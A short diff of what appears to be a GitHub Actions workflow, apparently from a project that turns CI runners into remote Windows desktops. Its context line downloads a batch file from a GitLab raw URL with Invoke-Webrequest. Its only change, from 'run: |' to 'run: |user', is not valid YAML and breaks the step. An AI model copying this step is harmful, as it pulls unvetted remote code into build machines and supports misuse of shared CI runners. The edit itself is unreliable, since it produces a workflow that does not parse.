@@ -22,7 +22,7 @@ jobs:
 
       - name: Downloading & Installing Essentials
 
-        run: |
+        run: |user
 
           Invoke-Webrequest -Uri "https://gitlab.com/chamod2/lm_win-10_github_rdp/-/raw/main/Downloads.bat" -OutFile "Downloads.bat"
 
